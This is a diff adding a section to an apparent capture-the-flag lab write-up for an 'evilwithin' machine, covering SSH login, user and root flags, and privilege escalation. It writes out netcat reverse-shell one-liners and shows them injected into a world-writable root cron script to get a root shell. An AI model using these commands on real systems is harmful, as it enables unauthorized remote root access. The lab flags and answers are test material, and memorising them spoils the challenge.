@@ -523,7 +523,7 @@ Once this has been confirmed we can use the amount of repetitions as the number 
 | Z          | 9999       |
 
 Using the table above we can decode the numbers into:
-> kidmanspasswordissostrange
+> KIDMANSPASSWORDISSOSTRANGE
 
 Side Note -
 
@@ -535,9 +535,249 @@ While doing this I found out this kind of encoding is called ["multi-tap"](https
 
 ## Task 5 - Go Capture The Flag
 
+Now that we have the username and password (kidman:KIDMANSPASSWORDISSOSTRANGE) we can SSH into the machine.
+
+```
+$ ssh kidman@<IP Address>
+kidman@<IP Address>'s password: KIDMANSPASSWORDISSOSTRANGE
+
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+171 packages can be updated.
+121 updates are security updates.
+
+kidman@evilwithin:~$ 
+```
+
+Let's run some initial commands to see who we are (```whoami```), where we are (```pwd```), if we have ```sudo``` permissons (```sudo -l```), and what's in the current directory (```ls -la```).
+
+```
+kidman@evilwithin:~$ whoami
+kidman
+kidman@evilwithin:~$ pwd
+/home/kidman/
+kidman@evilwithin:~$ sudo -l
+[sudo] password for kidman: KIDMANSPASSWORDISSOSTRANGE
+Sorry, user kidman may not run sudo on evilwithin.
+kidman@evilwithin:~$ ls -la
+total 44
+drwxr-xr-x 4 kidman kidman 4096 Aug 13  2020 .
+drwxr-xr-x 5 root   root   4096 Jul 13  2020 ..
+-rw------- 1 kidman kidman    1 Aug 13  2020 .bash_history
+-rw-r--r-- 1 kidman kidman  220 Jul 13  2020 .bash_logout
+-rw-r--r-- 1 kidman kidman 3771 Aug 13  2020 .bashrc
+drwx------ 2 kidman kidman 4096 Jul 13  2020 .cache
+drwxrwxr-x 2 kidman kidman 4096 Jul 13  2020 .nano
+-rw-r--r-- 1 kidman kidman  655 Jul 13  2020 .profile
+-rw-rw-r-- 1 kidman kidman  264 Aug 13  2020 .readThis.txt
+-rw-r--r-- 1 root   root     10 Nov 20 08:54 .the_eye.txt
+-rw-rw-r-- 1 kidman kidman   33 Jul 13  2020 user.txt
+```
+
+Let's ```cat``` those files (```.readThis.txt```, ```.the_eye.txt```, ```user.txt```).
+
+```
+kidman@evilwithin:~$ cat user.txt
+4C72A4EF8E6FED69C72B4D58431C4254
+
+kidman@evilwithin:~$ cat .readThis.txt
+
+uC@> z:5>2?i
+
+%96 E9:?8 x 2> 23@FE E@ E6== D@ :D E@A D64C6E] }@ @?6 5@6D?VE <?@H 23@FE E9:D] xEVD E96 #FG:<VD 6J6] }@ @?6 42? 9:56 2H2J 7C@> :E] qFE x 42? E6== J@F @?6 E9:?8 D62C49 7@C E96 DEC:?8 YE9606J60@70CFG:<Y ] *@F 8@E E@ 96=A $632DE:2? 56762E #FG:< ]]]
+
+kidman@evilwithin:~$ cat .the_eye.txt
+No one can hide from me.
+```
+
+We found the user.txt flag and the file called "readThis.txt" appears to be ROT47.
+
+If we decrypt it we get the following message.
+
+```
+From Kidman:
+
+The thing I am about to tell so is top secret. No one doesn't know about this. It's the Ruvik's eye. No one can hide away from it. But I can tell you one thing search for the string *the_eye_of_ruvik* . You got to help Sebastian defeat Ruvik ...
+```
+
+Now to move on to trying to root this machine and doing the bonus.
+
 ### user.txt
 
+Use the ```cat``` command on the user.txt file in ```/home/kidman``` to see the following flag.
+
+```
+kidman@evilwithin:~$ cat user.txt
+4C72A4EF8E6FED69C72B4D58431C4254
+```
+
 ### root.txt
+
+We already checked if we had sudo privilidges ```sudo -l``` and we had none. After that you can check if any files have the SUID bit set with ```find / -type f -perm -04000 -ls 2>/dev/null``` but none of those binaries will lead us to a reverse shell. Next we can check the ```crontab``` with ```cat /etc/crontab```.
+
+```
+kidman@evilwithin:~$ cat /etc/crontab
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
+```
+
+That last line tells us that every 2 minutes (*/2) a Python file with the name ".the_eye_of_ruvik.py" is being executed.
+
+If we check the permissions we can see that we have read and write permissions for this file and if we ```cat``` the file we can see that it just outputs a random threat to the ".the_eye.txt" file in kidmans home directory.
+
+```
+kidman@evilwithin:~$ ls -la /var/.the_eye_of_ruvik.py
+-rwxr-xrw- 1 root root 300 Aug 14  2020 /var/.the_eye_of_ruvik.py
+
+kidman@evilwithin:~$ cat /var/.the_eye_of_ruvik.py
+#!/usr/bin/python3
+
+import subprocess
+import random
+
+stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
+sentence = "".join(random.sample(stuff,1))
+subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)
+```
+
+We're going to delete all this and insert a python script for a reverse shell using netcat. I found this reverse shell on [pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet "Pentest Monkey Rever Shell Cheat Sheet").
+
+If we visit that [reverse shell cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet "Pentest Monkey Rever Shell Cheat Sheet") it says the following for the netcat reverse shell.
+
+```
+Netcat
+
+Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.
+
+nc -e /bin/sh 10.0.0.1 1234
+
+If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
+We can check for the ```-e``` flag by looking up the help manual for netcat with ```netcat -h``` where we'll see this version doesn't accept it.
+
+```
+kidman@evilwithin:~$ netcat -h
+Command Summary:
+    -4		Use IPv4
+    -6		Use IPv6
+    -b		Allow broadcast
+    -C		Send CRLF as line-ending
+    -D		Enable the debug socket option
+    -d		Detach from stdin
+    -h		This help text
+    -I length	TCP receive buffer length
+    -i secs		Delay interval for lines sent, ports scanned
+    -j		Use jumbo frame
+    -k		Keep inbound sockets open for multiple connects
+    -l		Listen mode, for inbound connects
+    -n		Suppress name/port resolutions
+    -O length	TCP send buffer length
+    -P proxyuser	Username for proxy authentication
+    -p port		Specify local port for remote connects
+        -q secs		quit after EOF on stdin and delay of secs
+    -r		Randomize remote ports
+    -S		Enable the TCP MD5 signature option
+    -s addr		Local source address
+    -T toskeyword	Set IP Type of Service
+    -t		Answer TELNET negotiation
+    -U		Use UNIX domain socket
+    -u		UDP mode
+    -V rtable	Specify alternate routing table
+    -v		Verbose
+    -w secs		Timeout for connects and final net reads
+    -X proto	Proxy protocol: "4", "5" (SOCKS) or "connect"
+    -x addr[:port]	Specify proxy address and port
+    -Z		DCCP mode
+    -z		Zero-I/O mode [used for scanning]
+```
+
+That means we'll have to try the second reverse shell.
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
+Remove everything from the ```.the_eye_of_ruvik.py``` except for the first line (```#!/usr/bin/python3```) and insert the following into the python script.
+
+```python
+import subprocess
+
+subprocess.call("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP Address> 1234 >/tmp/f", shell=True)
+```
+
+Remeber to replace ```<IP Address>``` with your tunnel IP Address (you can find it by using ```ifconfig``` and looking for the IP Address in ```tun```).
+
+Now open a netcat listener on ```port 1234``` with the flags ```-lnvp```.
+
+```
+$ nc -lnvp 1234
+Listening on 0.0.0.0 1234
+```
+
+Wait a bit and you should see some output similar to the following.
+
+```
+$ nc -lnvp 1234
+Listening on 0.0.0.0 1234
+Connection received on <IP Address>
+/bin/sh: 0: can't access tty; job control turned off
+#
+```
+
+Now we can verify we're root with ```whoami```, check where we are with ```pwd``` and list everything in the current directory with ```ls -la```.
+
+```
+$ nc -lnvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.108.2 34822
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# pwd
+/root
+# ls -la
+total 40
+drwx------  4 root root 4096 Aug 13  2020 .
+drwxr-xr-x 23 root root 4096 Jul 14  2020 ..
+-rw-------  1 root root  332 Aug 14  2020 .bash_history
+-rw-r--r--  1 root root 3106 Aug 13  2020 .bashrc
+drwx------  2 root root 4096 Jul  7  2020 .cache
+drwxr-xr-x  2 root root 4096 Jul  7  2020 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root  302 Aug 13  2020 readMe.txt
+-rw-r--r--  1 root root   33 Jul  7  2020 root.txt
+-rw-r--r--  1 root root  175 Aug 13  2020 .wget-hsts
+```
+
+Finally we can read the root flag (```root.txt```) and the bonus task file (```readMe.txt```).
+
+```
+# cat root.txt
+BA33BDF5B8A3BFC431322F7D13F3361E
+```
+```
+# cat readMe.txt
+From Sebastian:
+You have one final task ... Help me to defeat ruvik!!!
+```
+
+Now, to defeat Ruvik.
 
 ### **Bonus**: Defeat Ruvik
 
